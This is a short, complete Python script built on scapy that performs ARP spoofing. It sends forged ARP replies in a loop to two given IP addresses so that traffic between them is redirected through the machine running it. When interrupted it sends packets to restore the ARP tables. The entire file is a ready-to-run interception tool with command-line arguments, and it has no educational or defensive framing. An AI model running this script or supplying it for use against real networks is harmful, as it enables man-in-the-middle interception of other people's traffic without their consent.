#! /usr/bin/python3

import scapy.all as scapy
import time
import argparse

def get_mac(ip):
    hwdst_request = scapy.ARP(pdst = ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_broadcast = broadcast / hwdst_request 
    answered= scapy.srp(arp_broadcast, timeout=1, verbose=False)[0]

    return answered[0][1].hwsrc


def spoffer(target ,spoofer_ip ):
    target_mac = get_mac(target)
    packet = scapy.ARP(op= 2,pdst = target, hwdst = target_mac, psrc = spoofer_ip)
    scapy.send(packet, verbose=False)


def restore(target_ip, spoofer_ip):
    r_target_mac = get_mac(target_ip)
    r_spoffed_mac = get_mac(spoofer_ip)
    r_packet = scapy.ARP(op=2, pdst = target_ip , hwdst =r_target_mac, psrc= spoofer_ip, hwsrc =r_spoffed_mac )
    scapy.send(r_packet, verbose=False, count= 4)


def arguments():
    parser = argparse.ArgumentParser(prog='Arpspoffer', usage='Arpspoofer -t [TARGET] -s [SPOFFER IP]')
    parser.add_argument('-t', '--target', dest='target_ip', help='this is the target to be spoofed')
    parser.add_argument('-s', '--spoofer', dest= 'spoofer_ip', help='this is the ip of the spoofer')
    args = parser.parse_args()

    if not args.target_ip:
        print('[-]please specify a target ip!')
    elif not args.spoofer_ip:
        print('[-]please specify a spoffer ip')
    else:
        return args





args = arguments()
counter = 0
try:
    while True:
        spoffer(args.target_ip, args.spoofer_ip)
        spoffer(args.spoofer_ip, args.target_ip )
        counter +=2 
        print('\r[+]packet sent are: {}'.format(counter), end='')
        time.sleep(2)
except KeyboardInterrupt:
    print('\n[+] ctrl + c was pressed....ARP Tables being restored')
    restore(args.target_ip, args.spoofer_ip)
    restore(args.target_ip, args.spoofer_ip)    